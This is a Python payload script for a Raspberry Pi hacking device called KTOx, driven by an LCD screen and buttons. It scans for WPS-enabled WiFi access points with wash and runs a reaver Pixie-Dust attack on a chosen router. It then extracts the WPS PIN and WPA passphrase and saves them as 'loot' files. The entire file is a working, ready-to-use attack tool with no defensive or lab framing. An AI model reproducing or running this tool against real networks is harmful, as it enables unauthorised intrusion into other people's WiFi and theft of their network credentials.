#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
import re
import threading
import json

# ----------------------------
# KTOx PATH and ROOT check
# ----------------------------
def is_root():
    return os.geteuid() == 0

# KTOx pathing
_BASE = os.path.dirname(os.path.abspath(__file__))
_PAYLOADS_DIR = os.path.abspath(os.path.join(_BASE, '..'))
if _PAYLOADS_DIR not in sys.path:
    sys.path.insert(0, _PAYLOADS_DIR)
if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')

# ----------------------------
# Third-party library imports
# ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
except Exception as e:
    print(f"[ERROR] Hardware libs missing: {e}", file=sys.stderr)
    sys.exit(1)

# ----------------------------
# WiFi helpers
# ----------------------------
def get_available_interfaces():
    try:
        import re as _re
        out = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5).stdout
        return _re.findall(r'Interface\s+(\S+)', out)
    except Exception:
        return []

try:
    import monitor_mode_helper
    WIFI_INTEGRATION_AVAILABLE = True
except Exception:
    WIFI_INTEGRATION_AVAILABLE = False
    class monitor_mode_helper:
        @staticmethod
        def activate_monitor_mode(iface): return None
        @staticmethod
        def deactivate_monitor_mode(iface): return False

# Load PINS from KTOx gui_conf.json
PINS: dict[str, int] = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
try:
    import json
    def _find_gui_conf():
        candidates = [
            os.path.join(os.getcwd(), 'gui_conf.json'),
            os.path.join('/root/KTOx', 'gui_conf.json'),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
        ]
        for sp in sys.path:
            try:
                if sp and os.path.basename(sp) == 'KTOx':
                    candidates.append(os.path.join(sp, 'gui_conf.json'))
            except Exception:
                pass
        for p in candidates:
            if os.path.exists(p):
                return p
        return None
    conf_path = _find_gui_conf()
    if conf_path:
        with open(conf_path, 'r') as f:
            data = json.load(f)
        conf_pins = data.get("PINS", {})
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": conf_pins.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": conf_pins.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": conf_pins.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": conf_pins.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": conf_pins.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": conf_pins.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

WIFI_INTERFACE = None
ORIGINAL_WIFI_INTERFACE = None
KTOX_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
LOOT_DIR = os.path.join(KTOX_DIR, "loot", "WPS_Pixie")
running = True
attack_process = None
status_lines = ["Waiting to start..."]
ui_lock = threading.Lock()

def cleanup(*_):
    global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
    if running:
        running = False
        if attack_process:
            try:
                os.kill(attack_process.pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
    
    if WIFI_INTERFACE and ORIGINAL_WIFI_INTERFACE: # wifi_manager is removed
        print(f"Attempting to deactivate monitor mode on {WIFI_INTERFACE} and restoring {ORIGINAL_WIFI_INTERFACE}...", file=sys.stderr)
        success = monitor_mode_helper.deactivate_monitor_mode(WIFI_INTERFACE)
        if success:
            print(f"Successfully deactivated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
        else:
            print(f"ERROR: Failed to deactivate monitor mode on {WIFI_INTERFACE}", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_message(message, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    y = 40
    for line in message.split('\n'):
        bbox = d.textbbox((0, 0), line, font=FONT_TITLE)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (WIDTH - w) // 2
        d.text((x, y), line, font=FONT_TITLE, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_list_ui(title, items, selected_index):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), title, font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    if not items:
        d.text((10, 60), "Nothing found.", font=FONT, fill="white")
    else:
        start_index = max(0, selected_index - 3)
        end_index = min(len(items), start_index + 7)
        y_pos = 25
        for i in range(start_index, end_index):
            color = "yellow" if i == selected_index else "white"
            line = items[i]['essid'][:16]
            d.text((5, y_pos), line, font=FONT, fill=color)
            y_pos += 12
            
    d.text((5, 110), "OK=Select | KEY3=Back", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_attack_ui():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "WPS Pixie-Dust Attack", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    with ui_lock:
        y_pos = 25
        for line in status_lines:
            d.text((5, y_pos), line, font=FONT, fill="white")
            y_pos += 12
            
    d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="orange")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
    d.line([(0, 22), (128, 22)], fill="cyan", width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, status_lines
    
    available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
    # Prefer wlan1 if present
    if 'wlan1' in available_interfaces:
        available_interfaces.remove('wlan1')
        available_interfaces.insert(0, 'wlan1')
    if not available_interfaces:
        draw_message("No WiFi interfaces found!", "red")
        time.sleep(3)
        return False

    current_menu_selection = 0
    while running:
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["UP"]) == 0:
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["DOWN"]) == 0:
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["OK"]) == 0:
            selected_iface = available_interfaces[current_menu_selection]
            draw_message(f"Activating monitor\nmode on {selected_iface}...", "yellow")
            print(f"Attempting to activate monitor mode on {selected_iface}...", file=sys.stderr)
            
            ORIGINAL_WIFI_INTERFACE = selected_iface # Store original interface before activation
            monitor_iface = monitor_mode_helper.activate_monitor_mode(selected_iface)
            if monitor_iface:
                WIFI_INTERFACE = monitor_iface
                draw_message(f"Monitor mode active\non {WIFI_INTERFACE}", "lime")
                print(f"Successfully activated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
                time.sleep(2)
                return True
            else:
                draw_message(["ERROR:", "Monitor mode failed!", "Check stderr for details."], "red")
                print(f"ERROR: monitor_mode_helper.activate_monitor_mode failed for {selected_iface}. See stderr for details from helper.", file=sys.stderr)
                time.sleep(3)
                return False
        elif GPIO.input(PINS["KEY3"]) == 0:
            return False
        
        time.sleep(0.1)

def check_dependencies():
    deps = ["reaver", "wash", "iw"]
    for dep in deps:
        if subprocess.run(["which", dep], capture_output=True).returncode != 0:
            return dep
    return None

def scan_for_targets():
    draw_message("Scanning with wash...")
    targets = []
    attempts = [
        ["wash", "-i", WIFI_INTERFACE, "-j"],
        ["wash", "-i", WIFI_INTERFACE, "--json"],
    ]
    try:
        for cmd in attempts:
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                try:
                    stdout, _ = proc.communicate(timeout=12)
                except subprocess.TimeoutExpired:
                    proc.terminate()
                    try:
                        stdout, _ = proc.communicate(timeout=2)
                    except Exception:
                        stdout = ""
                if not stdout:
                    continue
                parsed = False
                s = stdout.strip()
                try:
                    if s.startswith("["):
                        import json
                        arr = json.loads(s)
                        for data in arr:
                            bssid = data.get('bssid')
                            essid = data.get('essid') or data.get('ssid') or 'Hidden'
                            channel = data.get('channel')
                            if bssid and channel:
                                targets.append({"bssid": bssid, "essid": essid, "channel": channel})
                        parsed = True
                    else:
                        for line in s.splitlines():
                            line = line.strip()
                            if not line:
                                continue
                            try:
                                import json
                                data = json.loads(line)
                                bssid = data.get('bssid')
                                essid = data.get('essid') or data.get('ssid') or 'Hidden'
                                channel = data.get('channel')
                                if bssid and channel:
                                    targets.append({"bssid": bssid, "essid": essid, "channel": channel})
                                parsed = True
                            except Exception:
                                continue
                except Exception:
                    parsed = False
                if targets or parsed:
                    break
            except Exception:
                continue
    except Exception as e:
        print(f"Wash scan failed: {e}", file=sys.stderr)
    return targets

def run_attack(target):
    global attack_process, status_lines
    
    bssid = target['bssid']
    channel = target['channel']
    essid = target['essid']
    
    command = [
        "reaver",
        "-i", WIFI_INTERFACE,
        "-b", bssid,
        "-c", str(channel),
        "-K", "1",
        "-vv"
    ]
    
    attack_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    wps_pin = None
    wpa_psk = None

    while running and attack_process.poll() is None:
        line = attack_process.stdout.readline()
        if not line:
            break
        
        line = line.strip()
        with ui_lock:
            if "[+]" in line:
                status_lines = [essid[:16], line.replace("[+]", "").strip()]
            elif "[!" in line:
                status_lines = [essid[:16], "Error:", line.replace("[!", "").strip()[:20]]
            
            if "WPS PIN:" in line:
                wps_pin = line.split(':')[1].strip().replace("'", "")
            if "WPA PSK:" in line:
                wpa_psk = line.split(':')[1].strip().replace("'", "")

        if wpa_psk:
            break

    if wpa_psk:
        with ui_lock:
            status_lines = ["Success!", f"PIN: {wps_pin}", f"PSK: {wpa_psk[:16]}"]
        os.makedirs(LOOT_DIR, exist_ok=True)
        loot_file = os.path.join(LOOT_DIR, f"{essid.replace(' ', '_')}.txt")
        with open(loot_file, "w") as f:
            f.write(f"ESSID: {essid}\n")
            f.write(f"BSSID: {bssid}\n")
            f.write(f"WPS PIN: {wps_pin}\n")
            f.write(f"WPA PSK: {wpa_psk}\n")
    elif running:
        with ui_lock:
            status_lines = ["Attack failed or", "was stopped."]

if __name__ == '__main__':
    if not is_root():
        print("ERROR: This script requires root privileges.", file=sys.stderr)
        # Attempt to display on LCD if possible
        try:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            img = Image.new("RGB", (128, 128), "black")
            d = ImageDraw.Draw(img)
            FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
            d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception as e:
            print(f"Could not display error on LCD: {e}", file=sys.stderr)
        sys.exit(1)
        
    try:
        dep_missing = check_dependencies()
        if dep_missing:
            draw_message(f"{dep_missing} not found!", "red")
            time.sleep(5)
            raise SystemExit(f"{dep_missing} not found")

        if not select_interface_menu():
            draw_message("No interface selected\nor monitor mode failed.", "red")
            time.sleep(3)
            raise SystemExit("No interface selected or monitor mode failed.")

        while running:
            targets = scan_for_targets()
            
            if not targets:
                draw_message("No vulnerable\ntargets found.")
                time.sleep(3)
                continue

            selected_index = 0
            while running:
                draw_list_ui("Select Target", targets, selected_index)
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    break
                
                if GPIO.input(PINS["UP"]) == 0:
                    selected_index = (selected_index - 1) % len(targets)
                    time.sleep(0.2)
                elif GPIO.input(PINS["DOWN"]) == 0:
                    selected_index = (selected_index + 1) % len(targets)
                    time.sleep(0.2)
                elif GPIO.input(PINS["OK"]) == 0:
                    target = targets[selected_index]
                    attack_thread = threading.Thread(target=run_attack, args=(target,), daemon=True)
                    attack_thread.start()
                    
                    while attack_thread.is_alive():
                        draw_attack_ui()
                        if GPIO.input(PINS["KEY3"]) == 0:
                            cleanup()
                            break
                        time.sleep(1)
                    
                    attack_thread.join(timeout=2)
                    draw_attack_ui()
                    time.sleep(5)
                    break
                
                time.sleep(0.05)
            
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("WPS Pixie-Dust payload finished.")
